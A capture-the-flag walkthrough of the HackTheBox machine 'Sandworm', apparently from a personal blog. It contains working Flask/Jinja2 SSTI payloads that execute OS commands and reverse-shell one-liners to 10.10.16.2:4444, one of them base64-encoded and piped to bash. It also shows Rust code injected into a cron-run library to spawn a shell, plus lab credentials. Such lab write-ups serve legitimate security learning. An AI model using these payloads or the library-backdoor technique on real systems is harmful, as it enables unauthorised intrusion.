---
title: Sandworm - HackTheBox
date: 2023-06-20 11:06 +0200
categories: [Medium,Linux]
tags: [sandworm, hackthebox]
---

![Sandworm](/assets/img/obsidian/Sandworm.png)

Hello! Today we will be tackling the machine Sandworm on HackTheBox. In this walk-through, we will cover the following points:

1. [Introduction to the machine](#introduction-to-the-machine)
2. [Reconnaissance and information gathering](#reconnaissance-and-information-gathering)
3. [Exploitation and gaining initial access](#exploitation-and-gaining-initial-access)
4. [Privilege escalation techniques](#privilege-escalation-techniques)
5. [Post-exploitation](#post-exploitation)
6. [Conclusion and key takeaways](#conclusion-and-key-takeaways)

Throughout this walk-through, we will be utilizing various tools and techniques to overcome challenges and progress towards rooting the machine. So, let's dive in and get started with the HackTheBox machine named Sandworm. Happy hacking!
## Introduction to the machine
The Sandworm machine presents a medium difficulty level and will guide us through a distinct SSTI (Server-Side Template Injection) experience. It involves the usage of GPG-encrypted keys and an unconventional privilege escalation technique, which requires horizontal movement between different users on the machine before obtaining a root shell. This machine provides a comprehensive learning opportunity, as we navigate through new concepts and gain a deeper understanding of the processes at play.
## Reconnaissance and information gathering
As usual, our first step will involve conducting a simple reconnaissance of what we are facing.
```bash
[*] Extracting information...


	[*] Target Ip: 10.129.33.177

	[*] Operating system: Linux

	[*] Open ports: 22,80,443

	[*] Services information: 

		PORT    STATE SERVICE  VERSION
		22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
		80/tcp  open  http     nginx 1.18.0 (Ubuntu)
		443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
```
Given that we are dealing with web services on ports 80 and 443, our next step will be to investigate them using a web browser. It becomes apparent that port 80 automatically redirects to port 443. Therefore, we will focus our fuzzing efforts solely on this endpoint. 
> Remember to add "ssa.htb" to the `/etc/hosts file`.
>  {: .prompt-info }
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000111:   200        76 L     554 W      5584 Ch     "about"      
000000101:   200        68 L     261 W      3543 Ch     "contact"    
000000381:   200        82 L     249 W      4392 Ch     "login"      
000001231:   302        5 L      22 W       225 Ch      "view"       
000002441:   302        5 L      22 W       227 Ch      "admin"      
000003751:   200        154 L    691 W      9043 Ch     "guide"      
000010711:   200        53 L     61 W       3187 Ch     "pgp"        
000012101:   302        5 L      22 W       229 Ch      "logout"     
000019121:   405        5 L      20 W       153 Ch      "process"    
000452251:   200        123 L    634 W      8159 Ch     "https://ssa.htb/"  
```
## Exploitation and gaining initial access

The website offers detailed explanations and guidance on understanding the functionality of GPG (GNU Privacy Guard) and the processes involved in encrypting, decrypting, and signing messages. To facilitate our learning, the website provides a public GPG key that can be accessed at `https://ssa.htb/pgp`, as well as a dedicated guide available at `https://ssa.htb/guide`. These resources will enable us to explore the workings of GPG keys and understand how to create and manage them effectively.

During the creation of GPG keys, we are prompted to provide a name and an email address, which are used to generate the key. To streamline this process, we can create a simple bash script that allows us to input the name and email via the command line.
```bash
gpg --batch --passphrase "" --gen-key <<EOF
%no-protection
Key-Type: default
Name-Real: $1
Name-Email: $2@gmail.com
Preferences: SHA256
EOF

gpg --armor --export $2@gmail.com && gpg --batch --yes --clear-sign --local-user $2@gmail.com encrpytion_01 && echo; echo '-------------------------------' ; echo; cat encrpytion_01.asc
```
Since the Flask app utilizes templates to display success or failure messages for the sign part, we have an opportunity to exploit Server-Side Template Injection (SSTI) by crafting a malicious payload.

To begin, we can attempt a basic injection like `{{7*7}}`, which should evaluate to 49 and replace the initial string.

Afterwards, we can explore more sophisticated and crafted payloads to execute certain actions.
```python
{{namespace.__init__.__globals__.os.popen('ls').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
We proceeded with attempting to retrieve the ID of the user or service running the app, and also explored the contents of the working directory. Once we confirmed that this approach was successful, I attempted to establish a reverse shell. However, it seemed that the reverse shell was not functioning as expected. As a workaround, I decided to base64 encode the reverse shell payload and then decode it on the remote machine. Remarkably, this approach proved to be successful.
```bash payload
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.2/4444 0>&1"').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('echo IyEvYmluL2Jhc2gKYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0NDQgMD4mMSIKCg== | base64 -d | bash').read()}}
```
Once we have obtained the shell, our next task is to explore the current location. During the exploration, I discovered a file named "admin.json" in the home directory, which is likely to contain some credentials or important information.
```json
"password": "quietLiketheWind22",
"type": null,
"username": "silentobserver"
```
After successfully obtaining the credentials from the "admin.json" file, we attempted to establish an SSH connection using those credentials. Fortunately, the login attempt was successful, granting us access to the victim machine with a valid user account. With this privileged access, we are now capable of executing commands on the target system.
```bash
silentobserver@sandworm:~$ (uname -n; echo '-'; ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | tail -n 1) | tr -d '\n'; echo;
sandworm-10.10.11.218
```
## Privilege escalation techniques
After conducting further enumeration of the machine, we discovered a cron job that was responsible for moving and executing files located in the directories `/opt/tipnet` and `/opt/crates`. 

Within the latter directory, we found a Rust script that can be modified. By editing and compiling the script, we can leverage the cron job to execute it within the context of the "atlas" user. This will grant us a functional shell with the privileges of the "atlas" user.

To make the necessary modifications, we need to edit the `/opt/crates/logger/src/lib.rs` file. Inside the file, we should add an "include" statement and a new command within the public "log" function.
```rust 
use std::process::Command;
pub fn log(...){
	...
	let output = Command::new("bash")
	.arg("-c")
	.arg("bash -i >& /dev/tcp/10.10.16.2/4444 0>&1")
	.output()
	.expect("Error executing command");
}
```
Once we have made the necessary modifications to the `lib.rs` file, it is time to compile and run the program located in `/opt/tipnet`. To achieve this, we need to follow these steps:

1. Navigate to the `/opt/tipnet` directory using the command `cd /opt/tipnet`.
2. Compile the program by running `cargo build --offline`.
3. Once the program has been successfully compiled, execute it using `cargo run --offline`.

By following these steps, we can compile and run the program located in `/opt/tipnet`, leveraging the modifications made in the `lib.rs` file. This will allow us to execute the program under the context of the "atlas" user and potentially gain a functional shell with elevated privileges.
 > This will generate an error on the command line output but the files are compiled and run anyway.
 {: .prompt-warning }

After patiently waiting, we have successfully received a reverse shell as the user "atlas" through netcat. Now, with a fully functioning shell, it's time to re-enumerate and explore the machine with our newfound user privileges.

During our enumeration, we discover a setuid binary named "firejail" that has elevated permissions. This binary has a known vulnerability that can be exploited to gain root access on the system. To understand the details of this vulnerability, you can refer to the article found at [this link](https://seclists.org/oss-sec/2022/q2/188). Additionally, a proof-of-concept (PoC) script can be accessed at [this link](https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin).

To exploit this vulnerability, we execute the PoC script using Python. Upon execution, the script outputs the following command:

`You can now run 'firejail --join=1826864' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.`

Since we require another shell to continue, we can either repeat the previous process or generate an SSH key pair on our local machine and add the public key file to the `~/.ssh/authorized_keys` file on the remote machine. Once that is done, we can execute the provided command in our new shell, which will switch us to the root user.

## Post-exploitation
As we have gained root access on the machine, it's time to search for our loot using the designated searching-flag command.
```
root@sandworm:~# (whoami; echo '-'; ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | tail -n 1) | tr -d '\n'; echo;
root-10.10.11.218
find / -type f \( -name root.txt -o -name user.txt \) -exec bash -p -c 'echo {} - $(cat {})' \;
```
## Conclusion and key takeaways
This medium machine has proven to be quite a challenge. We encountered and overcame several obstacles along the way. Initially, we tackled Server-Side Template Injection (SSTI) by utilizing encryption keys and an encoding method. However, this led us to a different escalation path where we exploited insecure file permissions. This allowed us to move laterally and gain access to a user account that had the ability to execute an insecure SUID binary, ultimately granting us a root shell.

Additionally, it is worth mentioning that there were some rabbit holes within the machine that turned out to be completely irrelevant, such as discovering MySQL credentials (`mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream`) inside the tipnet folder files.

To provide a better understanding of the GPG command and its usage, I have listed below some commands that can help in comprehending the functionality and concepts involved.
These commands provide a basic understanding of how GPG encryption, decryption, signing, and verification work.
```
#Generate a new key pair
gpg --gen-key   

#Encrypt a message
gpg -a --recipient atlas@ssa.htb --encrypt --output encrypted_01.pgp encrpytion_01

#Decrypt a message
gpg --decrypt encrypted_02.pgp  

#Show a public key
gpg --armor --export atlas@ssa.htb

#Sign a message
gpg --clear-sign --local-user '{{7*7}}@gmail.com' encrpytion_01

#Delete all generated keys
gpg --list-keys --with-colons | awk -F: '/^pub:/ { print $5 }' | xargs -I {} gpg --delete-secret-and-public-keys {}  
```